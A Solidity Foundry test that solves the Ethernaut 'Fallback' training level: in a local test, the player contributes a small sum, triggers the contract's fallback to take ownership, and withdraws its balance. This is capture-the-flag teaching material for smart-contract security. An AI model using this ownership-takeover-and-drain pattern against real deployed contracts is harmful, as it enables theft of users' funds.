// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testFallbackHack() public {
        /****************
         * Factory setup *
         *************** */
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        /****************
         *    Attack     *
         *************** */
         ethernautFallback.contribute{value: 0.0001 ether}();
        (bool success, ) = payable((address(ethernautFallback))).call{value: levelAddress.balance}("");
        require(success, "Fallback failed to send ether");
        require((ethernautFallback).owner() == player, "Failed to hack fallback");
        ethernautFallback.withdraw();
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
